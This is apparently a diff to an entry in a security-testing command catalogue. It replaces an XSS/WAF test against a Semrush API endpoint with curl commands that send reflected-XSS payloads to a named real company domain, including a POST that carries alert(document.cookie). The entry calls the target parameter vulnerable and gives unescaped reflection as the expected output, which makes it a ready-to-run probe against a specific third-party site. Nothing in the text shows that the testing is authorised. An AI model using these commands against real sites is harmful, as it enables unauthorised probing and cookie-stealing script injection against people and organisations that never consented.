@@ -1,11 +1,8 @@
 ---
-data: >-
-  curl -X GET
-  "https://api.semrush.com/reports/v1/projects/YOUR_PROJECT_ID/siteaudit/page/list?url=<script>alert(1)</script>"
-  -H "Authorization: Bearer YOUR_API_TOKEN"
+data: 'curl "https://sdrc.starbucks.com/search?q=<script>alert(''XSS'')</script>" -v'
 tags:
   - xss
-  - waf
+  - testing
 type: command
 output: null
 executor: bash
@@ -13,9 +10,9 @@ platforms:
   - Linux
   - macOS
   - Windows
-created_at: '2023-10-01T00:00:00Z'
-updated_at: '2025-12-14T03:47:18.084Z'
-id: ac8c328c-c712-4f95-ab15-ff4ffcbc069c
+id: 5c2c6690-bc51-4068-9934-a7645d36dd0f
+created_at: '2025-12-14T17:25:18.336Z'
+updated_at: '2025-12-14T17:25:18.336Z'
 verified: false
 validated: true
 submitted: true
@@ -25,31 +22,39 @@ submitted: true
 ## Command
 
 ```bash
-curl -X GET "https://api.semrush.com/reports/v1/projects/YOUR_PROJECT_ID/siteaudit/page/list?url=<script>alert(1)</script>" -H "Authorization: Bearer YOUR_API_TOKEN"
+curl "https://sdrc.starbucks.com/search?q=<script>alert('XSS')</script>" -v
 ```
 
 ## Description
 
-Injects a standard XSS payload to test WAF response.
+This command tests for reflected XSS by sending a URL-encoded payload via curl to a vulnerable parameter on the target site, helping confirm if input is reflected unsanitized.
 
 ## Parameters
 
 | Parameter | Description | Required |
 |-----------|-------------|----------|
-| `url=<script>alert(1)</script>` | XSS payload | Yes |
+| `URL` | Target endpoint with payload in query param | Yes |
+| `-v` | Verbose output to inspect headers and response | No |
+| `q=<script>alert('XSS')</script>` | XSS test payload (URL-encode if needed) | Yes |
 
 ## Examples
 
 ### Basic Usage
 
 ```bash
-curl -X GET "https://api.semrush.com/reports/v1/projects/123/siteaudit/page/list?url=<img src=x onerror=alert(1)>" -H "Authorization: Bearer token"
+curl "https://sdrc.starbucks.com/search?q=<script>alert('XSS')</script>" -v
+```
+
+### Advanced Usage
+
+```bash
+curl -X POST "https://sdrc.starbucks.com/form" -d "input=<script>alert(document.cookie)</script>" -v
 ```
 
 ## Expected Output
 
-WAF block or sanitized response.
+HTTP response showing the payload reflected in the body without escaping, e.g., the <script> tag appears as-is, indicating potential XSS.
 
 ## Related
 
-- [[Related Procedure: Test-XSS-Payloads-Against-WAF]]
+- [[Related Procedure: Test-for-XSS-Vulnerability]]
